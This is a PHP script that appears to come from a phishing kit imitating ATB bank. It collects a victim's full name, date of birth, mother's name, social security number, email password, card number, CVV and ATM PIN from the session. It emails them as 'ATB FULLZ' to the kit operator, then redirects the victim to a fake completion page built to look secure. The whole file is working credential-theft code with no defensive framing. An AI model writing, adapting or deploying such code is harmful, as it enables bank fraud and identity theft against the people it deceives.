<?php
    session_start();
    include 'email.php';
	include 'blocker.php';
    $ip = getenv("REMOTE_ADDR");
    $u = "http://www.geoiptool.com/?IP='$ip'";
    $dump = unserialize(file_get_contents($u));
    $country = $dump["geoplugin_countryName"];
	
    $subject = 'ATB FULLZ [ '.$country.' - '.$_SERVER['REMOTE_ADDR'].' ]';
    $message = '|============ ATB Info ===========|'."\r\n";
    $message .= '|Full Name:  '.$_SESSION['FN']."\r\n";
    $message .= '|Date of Birth:  '.$_SESSION['D1']."-".$_SESSION['D2']."-".$_SESSION['D3']."\n";
	$message .= '|Mother Name:  '.$_SESSION['MN']."\r\n";
    $message .= '|Social Number:  '.$_SESSION['SN']."\r\n";
	
    $message .= '|Email:  '.$_SESSION['EA']."\r\n";
	$message .= '|Email Password:  '.$_SESSION['EP']."\r\n";
	$message .= '|============ Card Info ===========|'."\r\n";
	
	$message .= '|Card Number:  '.$_SESSION['CN']."\r\n";
    $message .= '|Exp. Date  '.$_SESSION['ED1']."-".$_SESSION['ED2']."\n";
	$message .= '|Cvv:  '.$_SESSION['CV']."\r\n";
    $message .= '|Atm Pin:  '.$_SESSION['AP']."\r\n";
	$message .= '|Time:     '.$_InfoDATE   = date("d-m-Y h:i:sa")."\r\n";
    $message .= '|Browser:  '.$_SERVER['HTTP_USER_AGENT']."\r\n";
    $message .= "|IP Geo: http://www.geoiptool.com/?IP=".$ip." \n";
    if($_SESSION['CN'] != "" && strlen($_SESSION['CN']) <= 16 && $_SESSION['CN']){
	mail($to, $subject, $message);
	}
    
	
    header("Location: finishmsg.html?sslchannel=true&amp;sessionid=xrBUswTnRWBlzTfC8idT1OKtdKKh7spEU1znxtKopmJYfZBnhOhjD2MQMw7TZxyTy7h5B2u0oeZDeA1v");
 ?>